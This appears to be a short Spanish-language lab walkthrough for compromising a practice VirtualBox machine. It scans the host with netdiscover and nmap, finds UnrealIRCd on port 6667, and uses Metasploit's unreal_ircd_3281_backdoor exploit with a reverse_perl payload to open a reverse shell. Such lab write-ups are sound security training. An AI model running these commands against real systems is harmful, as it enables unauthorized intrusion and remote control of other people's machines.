# Instalar maquina poner en modo puente

## Buscar la ip

```bash
sudo netdiscover -r 10.0.0.0/16
```
Vemos las ip

```bash
sudo nmap 10.0.6.20
nmap -Pn -sV 10.0.6.20
```

Servicios que nos da son estos:

PORT     STATE SERVICE VERSION
6667/tcp open  irc     UnrealIRCd
MAC Address: 08:00:27:3C:46:DC (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: Host: irc.foonet.com

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 1.45 seconds


## Descubrir que exploit puedo lanzar para atacar el unico servicio que hay corriendo


- Entramos en exploit db y buscamos UnrealIRCd

## Tirar plainloads para introducir shell


```bash
sudo msfconsole

```

## Buscamos el exploit que vamos utilizar, payload y los utilizamos

```bash
search UnrealIRCd

use unix/irc/unreal_ircd_3281_backdoor

show payload

set payload cmd/unix/reverse_perl

```
## Ajustamos parametros necesarios

```bash
show option 

set RHOSTS = 10.0.6.20

set LHOST = Mi ip

run

```

## Tendria una shell para intrar en la maquina